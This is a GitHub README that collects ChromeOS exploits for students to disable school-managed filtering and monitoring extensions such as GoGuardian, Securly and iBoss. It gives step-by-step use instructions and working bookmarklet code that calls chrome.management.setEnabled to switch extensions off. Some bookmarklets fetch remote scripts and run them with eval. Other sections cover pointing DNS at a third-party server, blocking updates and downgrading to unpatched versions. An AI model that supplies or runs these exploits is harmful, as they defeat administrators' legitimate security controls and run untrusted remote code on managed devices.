# EXT-REMOVER
This is a curated list of exploits for ChromeOS. It started with LTBEEF, and now there is more!
Many of these exploits can destory your computer if used inproperly. So PLEASE PLEASE make sure you follow these instructions very carefully!
If you need help ask it <a href="https://github.com/3kh0/ext-remover/discussions">here</a>
  
**ATTENTION ALL SYS ADMINS!!!**

Hello, I am Echo and I created this repo in order to give exploits for the masses and to prove one thing, chromebooks are literal trash, and a poor excuse for a computer. They are full of exploits, you might think you blocked/patched them all but then 3 more pop up. It is a endless game of wack-a-mole. Treat your students to a windows computer, they will thank you. And don't you dare start to think "My school district does not have that kind of money", it most likely does! How much are you paying the blocker companies? Think about that.

<img width="250px" src="https://user-images.githubusercontent.com/58097612/191354621-bf7ff072-b9d7-46b5-994a-4d2adbf0e4f3.png">  
Image Credit: LittleMissNyan
<details>
<summary><b> Extension Launcher (Bookmarklet) </summary>
A bookmarklet capable of installing extensions, for those without a allowlist. 

Steps: 
Go to <a href="https://extension-installer.glitch.me/code.js">here</a> bookmark the code there (Might make a dns)
go to chrome.google.com/webstorex and use the bookmarklet, then put the icon of the extension, the id, and name of it (Doesn't matter just put anything)
press download, and it will work.
**Extra Notes**
- Credit to "Aka, but nice" on discord.
- Dns will be up soon, if bookmarklets are blocked
- This will not work if you have a blocklist this is only for if when you go to the webstore it shows blocked
</details>
<details>
<summary><b>New Point-Blank</b> (Run scripts on extension pages)</summary>
This exploit allows you to run scripts, on extensions pages, this is a great example of how Chromebooks are a piece of garbage.

*Scroll down to preform this exploit!*


<i>Getting started</i>
(Note: if bookmarklets are blocked your screwed.)
  1. Go to <a href="https://spot-maze-chinchilla.glitch.me/ingot.js">here</a> (on your school chromebook of course)
2. Make a bookmark with the code there.
3. Once that is done.
  If you have Securly go to <a href="https://tinyurl.com/bettergoofcurly">here</a> if it says blocked by chrome, reload(you have to actually have securly ofc)
 If you have iBoss go to <a href="https://tinyurl.com/goofboss">here</a>, 
 
 If you have Cisco Umbrella go to <a href="https://tinyurl.com/goofumbrella">here</a>
 If you have Blocksi go to <a href="https://tinyurl.com/goofsi">here</a> 
 And if you have GoGuardian(might not work) go to <a href="https://tinyurl.com/goofguardian">here</a>. Now most of these links are a block page(this is intentional) on each page should have a blue link, click the link on the page if it opens a blank page click the bookmarklet that you just made and click either hard disable or soft disable, you can also run some of the scripts and run your own code, your extension may disable javascript being ran on it, so running your own code may not work.
**Extra notes**
- I recommend doing soft disable, which only disables it until restart. 
- The launcher was made by me, but the idea was from <a href="https://bolg.glitch.me/_/point-blank/">Bypassi#7037</a>
- If your school updated GoGuardian, this exploit may not work.

Please use this only when you have permisson, I (3kh0) do not condone the use of this exploit for illegal purposes!

</details>

<details>
<summary><b> UBoss </summary>

By the BlueHatCrew
https://dsc.gg/blue-hat-crew

This works only for iboss, cisco umbrella, blocksi and securely(maybe).
So if you don't have those then go tell your mommy.
First go to https://tinyurl.com/byeswamp if you have iboss. 
https://tinyurl.com/blockboss if you have Blocksi.
https://tinyurl.com/cyouboss if you have Cisco Umbrella. May not work
and https://tinyurl.com/suboss if you have securely. May not work.

Then bookmark the code below
```js
javascript:document.documentElement.innerHTML =   '<head> <center> <h1> [UBoss]  <strong> Ur </strong> moms the <strong> BOSS </strong> </h1> </center></head><br> <h4> <center> This is based off of the original swamp launcher, the new point-blank method and the old extesnion id disabler. <hr> <strong> Credits: </strong> Aka, but nice (for the main code layout and javscript), Bypassi (for the original Swamp code and Point-Blank), <a href="https://www.youtube.com/legoaxolotl?Sub_Confirmation=1">Lego Axolotl</a> (For name idea, and beta testing), and finally, the <a href="https://www.youtube.com/@thebluehatcrew/Sub_Confirmation=1">BlueHatCrew</a> for making the UI and initial idea of this. </h4> </center> <hr> <br><div><style> pre,textarea{display:inline-block;height:400px}*{box-sizing:border-box}body{padding:10px;font-size:110%;color:#349633%20;background-color:#2e2e31}h1{text-align:center;font-size:70px}h2{text-align:left;font-size:175%}button,input,pre,select,textarea{color:#000;font-size:15px}h1,h2,h3,button,label,p,select{font-family:Roboto,sans-serif}hr{border:none;border-bottom:3px%20solid%20#fff}input,kbd,pre,textarea{font-family:monospace;border:none}input,select,textarea{background-color:#fff;border-radius:10px;p%20dding:10px%2017px;border:none}button,input{background-color:#fff;padding:10px%2020px;margin:0%205px%205px%200}input{width:600px;border-radius:10px}textarea{white-space:pre;float:left;width:60%;border-radius:10px%200%200%2010px;resize:none;background-color:#99edc3;margin-bottom:15px}pre{border-radius:0%2010px%2010px%200;padding:8px;float:right;margin:0%200%2025px;width:40%;overflow-y:scroll;word-break:break-all;white-space:pre-line;background-color:#1c8e40}button{border:none;border-radius:10px;cursor:pointer;transition:filter%20250ms}button:hover{filter:brightness(.8)}.gg{background-color:#99edc3}a{color:#4fef7c;transition:color%20250ms}a:hover{color:#1c8e40}</style><br><br><center><input%20id="id"%20placeholder="Put%20Extension%20ID%20Here:%20(split%20by%20commas)"><br>%20<button%20id="disable">Disable</button>';%20document.getElementById("disable").addEventListener(%20%20%20"click",%20%20%20function%20()%20{%20%20%20%20%20var%20ids%20=%20document%20%20%20%20%20%20%20.getElementById("id")%20%20%20%20%20%20%20.value.split(",")%20%20%20%20%20%20%20.forEach((e)%20=>%20{%20%20%20%20%20%20%20%20%20opener.chrome.management.setEnabled(ids.trim(),%20false);%20%20%20%20%20%20%20});%20%20%20},%20%20%20!1%20);%20opener.chrome.management.getAll(function%20(extensions)%20{%20%20%20extensions.forEach((extension)%20=>%20{%20%20%20%20%20var%20button%20=%20document.createElement("button");%20%20%20%20%20(button.textContent%20=%20extension.name),%20%20%20%20%20%20%20(button.id%20=%20extension.id),%20%20%20%20%20%20%20(button.enabled%20=%20extension.enabled),%20%20%20%20%20%20%20(button.onclick%20=%20toggle);%20%20%20%20%20document.documentElement.appendChild(button);%20%20%20});%20});%20var%20blocking%20=%20false;%20function%20toggle()%20{%20%20%20if%20(blocking)%20{%20%20%20%20%20opener.chrome.management.setEnabled(this.id,%20false);%20%20%20}%20else%20{%20%20%20%20%20opener.chrome.management.setEnabled(this.id,%20true);%20%20%20}%20%20%20blocking%20=%20!blocking;%20}%20toggle();%20this.onclick%20=%20toggle();%20document.write(%20%20%20'<style>%20pre,textarea{display:inline-block;height:400px}*{box-sizing:border-box}body{padding:10px;font-size:110%;color:#fff;background-color:#2e2e31}h1{text-align:center;font-size:70px}h2{text-align:left;font-size:175%}button,input,pre,select,textarea{color:#000;font-size:15px}h1,h2,h3,button,label,p,select{font-family:Roboto,sans-serif}hr{border:none;border-bottom:3px%20solid%20#fff}input,kbd,pre,textarea{font-family:monospace;border:none}input,select,textarea{background-color:#fff;border-radius:10px;padding:10px%2017px;border:none}button,input{background-color:#fff;padding:10px%2020px;margin:0%205px%205px%200}input{width:600px;border-radius:10px}textarea{white-space:pre;float:left;width:60%;border-radius:10px%200%200%2010px;resize:none;background-color:#99edc3;margin-bottom:15px}pre{border-radius:0%2010px%2010px%200;padding:8px;float:right;margin:0%200%2025px;width:40%;overflow-y:scroll;word-break:break-all;white-space:pre-line;background-color:#1c8e40}button{border:none;border-radius:10px;cursor:pointer;transition:filter%20250ms}button:hover{filter:brightness(.8)}.gg{background-color:#99edc3}a{color:#99edc3;transition:color%20250ms}a:hover{color:#1c8e40}%20</style>%20<center>%20<input%20id="extension"%20placeholder="Put%20Extension%20Id%20Here"><button%20id="disable">Disable%20Extension</button>'%20),%20%20%20document.getElementById("disable").addEventListener(%20%20%20%20%20"click",%20%20%20%20%20function%20()%20{%20%20%20%20%20%20%20var%20ids%20=%20document%20%20%20%20%20%20%20%20%20.getElementById("extension")%20%20%20%20%20%20%20%20%20.value.split(",")%20%20%20%20%20%20%20%20%20.forEach((i)%20=>%20{%20%20%20%20%20%20%20%20%20%20%20opener.chrome.management.setEnabled(i.trim(),%20!1);%20%20%20%20%20%20%20%20%20});%20%20%20%20%20},%20%20%20%20%20!1%20%20%20);
```

Then go to the site with your blocker^.

And run the code. Follow the instructions there.
If it doesnt work let us know by creating a discussion.

This was made in partnership with Aka, but nice and Bypassi.

-Cubing Hay
</details>

<details>
<summary><b>CAUB</b> (Prevent Updates)</summary>
This exploit keeps your chromebook downgraded (or on the current version) without automatic updates screwing you over. This exploit was found by Catakang#0987. Using onc files, you can convince your chromebook that the wifi that you're connected to is pay-to-use (like a hotspot using data), and thus it will not check for updates.

*Scroll down to preform this exploit!*

![image](https://user-images.githubusercontent.com/58097612/212685932-ef9c802e-6040-42a3-be6e-10997162b7cd.png)

<i>Getting started</i>

1. Go to `chrome://network#state` (on your school chromebook of course; if this is blocked then ur kinda screwed lol).
2. Scroll to the bottom of the page; you should see a list of "favorite" wifis that you've connected to in the past.
3. Click the + sign next to the wifi name of each network that you commonly connect your chromebook to.
4. The more wifis you expand, the better, but note that they have to come from the "favorites" section.
5. Use ctrl+a and ctrl+c to copy all the text on the entire network#state page.
6. Go to [caub.glitch.me](https://caub.glitch.me/).
7. Paste the copied text into the textbox bshelow.
8. Press the "generate onc" button below the textbox.
9. Once you have downloaded the file, go to chrome://network#general
10. Click on the "import onc" button
11. Import the newly downloaded file

**Extra notes**
- Your chromebook will no longer automatically update. (as long as you are on a wifi that you used caub on)
- Be careful not to stay on a wifi for too long without using caub on it, otherwise you might update.
- We cannot guarantee that this will work on every wifi

Please use this only when you have permisson, I (3kh0) do not condone the use of this exploit for illegal purposes!

</details>

<details>
<summary><b>LTBEEF</b> (Disable extensions)</summary>
LTBEEF is an exploit, created by Bypassi#7037, which abuses api endpoints within the google chrome webstore.  

<b>Please Note:</b> This exploit only works on versions below 106, and eariler versions of 102
  
The original site created for this exploit can be found at <a href="https://ltbeef.netlify.app/">ltbeef.netlify.app</a>
  
**Installation**  
There are several vesions of this exploit you can use, here are the 2 most common versions:
- *Bookmarklets*  
    To use a GUI, bookmark one of the below scripts:  
    - Ingot  
    ```js
    javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())
    ```
    - Compact Cow's UI  
    ```js
    javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
    ```  
    - Compact Cow's UI (Dark)
    ```js
    javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);
    ```

    Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. Flip the switches on the extentions you want to disable. Simple!  

    Photos of the GUI's:
    ![image](https://user-images.githubusercontent.com/58097612/193318485-5267cd59-fb65-45a5-ad28-7f068bbce974.png)
    ![image](https://user-images.githubusercontent.com/58097612/190276894-fc492c5c-b0ce-4943-ae56-603f75634618.png)
   
- *DNS servers*  
    By changing your DNS server, you can use LTBEEF, even if bookmarklets are blocked.  
      
    First, go to Settings > Network > Wifi > Network, and click on "Custom Name Servers"
    ![image](https://user-images.githubusercontent.com/88395302/212482302-82334f42-c421-45c2-b210-1e700652b5be.png)  
    Set every box there to the following ip:  
    ```158.101.114.159``` (Hosted by The Greatest Giant#0110)  
    Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. Flip the switches on the extentions you want to disable. 


Please use this only when you have permisson, I (3kh0) do not condone the use of this exploit for illegal purposes!
</details>  

<details>
<summary><b>LTBEEF inspect</b> (Using inspect to disable extensions)</summary>

![image](https://user-images.githubusercontent.com/58097612/207386423-e6aa2095-d92d-44a8-a3d6-e42066bdf34e.png)

The screenshot below was preformed on 108.0.5359.75 (Official Build) (64-bit) on the stable channel.

This has been tested and does work but has varying levels of success, you will need access to inspect element, more specifically, console.

- Open this URL on your chromebook: `chrome-extension://gndmhdcefbhlchkhipcnnbkcmicncehk/manifest.json` Shortened link: https://tinyurl.com/i-ltbeef
- Open inspect and navigate to the console tab.
- Run the basic LTBEEF code such as
```js
chrome.management.setEnabled('extensionid', false)
```
Replacing `extensionid` with the ID of the extension you want to disable, e.g. the stuff after the = in the URL bar when you click the extension's "details" button in chrome://extensions

Credit to SprinkzMC#8421 (aka Bypassi) for finding this!

![image](https://user-images.githubusercontent.com/58097612/207385046-5a9f6f07-6089-4775-9183-c11bd24ba02c.png)

To re-enable just go to the chrome web listing for the extension and click on the banner.
</details>

<details>
<summary><b>Point Blank</b> (Run code on system pages)</summary>
Point Blank is an exploit that allows you to run bookmarklets on privilaged pages, sutch as the chrome extentions page.  
This exploit was also found by Bypassi, you can read more about how he discovered this exploit <a href="https://blog.bypassi.com/_/point-blank/"></a>
You can either use the prompt or the gui the prompt is below
1. Bookmark this code:







    javascript:let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 145);
    
    
    
    
    
   
And the gui is in launcher.js
2. Navigate to `chrome://extensions` 
3. Click on a extension that YOU installed from the Chrome Web Store > Details
4. In the URL bar, copy the string of letters and numbers after the `/?id=`
5. Click "View in Chrome Web Store" and spam the excape key. If it loads into chrome webstore try again, if it is a blank screen click the bookmarklet
5. Paste the id of the extension into the prompt or input box seperated by commas.
If you close the tab, the exploit will stop working.

Please use this only when you have permisson, I (3kh0) do not condone the use of this exploit for illegal purposes!
</details>

<details>
<summary><b>SH1mmer</b></summary>  
SH1mmer is an exploit devloped by the crew at Mercury Workshop. Credits can be found within the menu and on their site.  

Further information is now located at these links:

[Official Repository](https://github.com/CoolElectronics/sh1mmer)  
[Official Website (INSTRUCTIONS)](https://sh1mmer.me/)  
[Raw Shims Download](https://files.ultimatesrv.com/)  
[Wax4Web Shim Builder](https://build.ultimatesrv.com/)
</details>

<details>
<summary><b>Downgrading</b> (Change versions)</summary>  
Downgrading can be used for several exploits, to get to a version that does not have patches for certain exploits, sutch as LTBEEF. This is a built in feature of ChromeOS.

![image](https://user-images.githubusercontent.com/58097612/212685863-3d6b8ce1-7caa-4735-95a8-8eb6787b227c.png)

<i>Requirements</i>
1. A USB thumb drive with at least 4gb of storage, some board have small or bigger images, so have a beef usb, I recommend 16gb
2. A personal computer with access to downloading extentions
3. A brain

<i>Setup</i>
1. Navigate to chrome://version on the chromebook you with to downgrade and check for your board under "Platform" (ex I have a c3100 and it's board is stable-channel octopus)  
<img src="https://user-images.githubusercontent.com/88395302/212484378-65e6e6e3-b995-48a1-b229-3265a4993279.png">  
2. Navigate to https://chrome100.dev/ , press `ctrl+f` and type in your board
3. Find and download the chrome version you want to your personal computer

<i>Instlation</i>
1. Install Chromebook Recovery Utility onto your personal computer (found at <a href="https://chrome.google.com/webstore/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm?hl=en">https://chrome.google.com/webstore/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm?hl=en</a>
2. Open the extention, and click on the settings button in to top right hand corner, click "use local image"
3. Select the recovery image you downloaded from chrome100
4. Plug in the USB you wish to use, and follow the prompts on the screen
5. On your chromebook, press esc+reload+power and follow the prompts
6. On the checking for updates screen, press ctrl+shift+e to skip the "checking for updates" screen
7. Profit

Please use this only when you have permisson, I (3kh0) do not condone the use of this exploit for illegal purposes!
</details>
  
<details>
  <summary><b>Killcurly</b></summary>
Kill extension, by signing out.

1. Visit chrome://settings/signOut the O in Out must be capital.
2. Press the blue button
3. Go to chrome://restart
4. Now visit tinyurl.com/AddSession
5. Add your **SCHOOL** account back. It WILL NOT WORK if you add a home account back. This is just so you can still access Google Drive, Youtube, and any Google   service.
6. All extensions should stop working.
7. Note that you have to repeat this every time you restart or sign out.
  
  **Using this, may get your computer taken away if your school finds out.** 
**This was discoverered by zoroark**
Please use this only when you have permisson, I (3kh0) do not condone the use of this exploit for illegal purposes!
</details>


boop
